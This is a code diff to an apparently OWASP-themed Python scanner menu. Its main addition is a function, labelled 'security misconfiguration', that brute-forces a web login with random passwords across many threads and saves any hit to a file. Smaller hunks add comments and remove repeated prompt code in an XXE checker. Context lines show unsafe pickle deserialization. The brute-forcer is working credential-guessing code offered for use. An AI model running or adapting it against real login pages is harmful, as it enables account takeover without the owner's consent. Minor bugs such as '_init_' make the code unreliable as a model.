@@ -341,10 +341,80 @@ def phish():
         time.sleep(5)
         phish()
 
+#security misconfiguration
+def sm():
+    try:
+        import requests
+        import random
+        from threading import Thread
+        import os
 
-def known():
-    pass
+        url = input("Enter url (https://requestswebsite.notanothercoder.repl.co/confirm-login): ")
+        username = input("Enter username (admin): ")
+        n = int(input("Enter password length(8): "))
+        tn = int(input("Enter thread count(20): "))
 
+        def send_request(username, password):
+            data = {
+                "username": username,
+                "password": password
+            }
+
+            r = requests.get(url, data=data)
+            return r
+
+        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+
+        def main():
+            while True:
+                if "correct_pass.txt" in os.listdir():
+                    break
+                valid = False
+                while not valid:
+                    rndpasswd = random.choices(chars, k=n)
+                    passwd = "".join(rndpasswd)
+                    file = open("owasp/tries.txt", 'r')
+                    tries = file.read()
+                    file.close()
+                    if passwd in tries:
+                        pass
+                    else:
+                        valid = True
+
+                r = send_request(username, passwd)
+
+                if 'failed to login' in r.text.lower():
+                    with open("owasp/tries.txt", "a") as f:
+                        f.write(f"{passwd}\n")
+                        f.close()
+                    print(f"Incorrect {passwd}\n")
+                else:
+                    print(f"Correct Password {passwd}!\n")
+                    with open("correct_pass.txt", "w") as f:
+                        f.write(passwd)
+                    break
+
+        for x in range(tn):
+            Thread(target=main).start()
+        b = input("\n\n Do you want scan again (y/n): ")
+        if b == 'y' or b == 'Y':
+            sm()
+        else:
+            system('./owasp/main.py')
+
+    except KeyboardInterrupt:
+        a = input("\n\nDo you want to EXIT (y/n): ")
+        if a == 'n' or a == 'N':
+            sm()
+        else:
+            system('./owasp/main.py')
+
+    except:
+        print (colored("\n\nYour entry was wrong.\n","red"))
+        print(colored("Try correct url format (http://google.com)", "green"))
+        time.sleep(5)
+        sm()
+#Insecure Deslization
 def id():
     class User(object):
         def _init_(self, name):
@@ -367,6 +437,8 @@ def id():
     userDeserialized = pickle.loads(raw_data)
     print(userDeserialized.name)
 
+
+#external xml entity
 def xxe():
     try:
         system('clear')
@@ -382,11 +454,6 @@ def xxe():
                 xxe()
             else:
                 system('./owasp/main.py')
-                b = input("\n\n Do you want scan again (y/n): ")
-                if b == 'y' or b == 'Y':
-                    xxe()
-                else:
-                    system('./owasp/main.py')
         else:
             print("\n This page doesn't contain XML data, So this is Secure to XXE")
             b = input("\n\n Do you want scan again (y/n): ")
@@ -394,11 +461,6 @@ def xxe():
                 xxe()
             else:
                 system('./owasp/main.py')
-                b = input("\n\n Do you want scan again (y/n): ")
-                if b == 'y' or b == 'Y':
-                    xxe()
-                else:
-                    system('./owasp/main.py')
     except KeyboardInterrupt:
         a = input("\n\nDo you want to EXIT (y/n): ")
         if a == 'n' or a == 'N':
